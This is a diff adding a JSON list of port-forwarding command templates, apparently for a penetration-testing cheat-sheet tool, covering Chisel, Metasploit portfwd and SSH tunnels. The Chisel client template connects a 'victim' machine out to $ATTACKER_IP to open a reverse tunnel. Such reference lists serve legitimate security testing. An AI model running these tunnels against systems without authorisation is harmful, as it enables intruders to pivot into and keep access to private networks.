@@ -1,0 +1,39 @@
+{
+    "commands":[
+  {
+    "title": "Chisel Reverse Port Forwarding (Server - Attacker)",
+    "description": "Start a Chisel server in reverse mode on the attacker's machine to allow incoming client connections.",
+    "template": "chisel server -p $ATTACKER_PORT -reverse"
+  },
+  {
+    "title": "Chisel Reverse Port Forwarding (Client - Victim)",
+    "description": "Connect from the victim machine to the attacker's server and expose a remote port to the attacker's machine.",
+    "template": ".\\chisel.exe client $ATTACKER_IP:$ATTACKER_PORT R:$REMOTE_PORT:localhost:$LOCAL_PORT"
+  },
+  {
+    "title": "Metasploit Port Forwarding - Add",
+    "description": "Forward a local port to a remote address and port using Metasploit’s portfwd command.",
+    "template": "portfwd add -l {local_port} -p {remote_port} -r {target_ip}"
+  },
+  {
+    "title": "Metasploit Port Forwarding - List",
+    "description": "List all current port forwards in Metasploit.",
+    "template": "portfwd list"
+  },
+  {
+    "title": "Metasploit Port Forwarding - Delete",
+    "description": "Remove a previously set port forward in Metasploit.",
+    "template": "portfwd delete -l {local_port} -p {remote_port} -r {target_ip}"
+  },
+  {
+    "title": "SSH Local Port Forwarding",
+    "description": "Forward a port from the local machine to a remote machine using SSH.",
+    "template": "ssh -N -L {local_port}:{target_ip}:{target_port} user@{target_ip}"
+  },
+  {
+    "title": "SSH Remote Port Forwarding",
+    "description": "Expose a port on the remote machine that forwards to a local address and port.",
+    "template": "ssh -N -R {target_port}:{local_host/local address}:{local_port} user@{target_ip}"
+  }
+]
+}
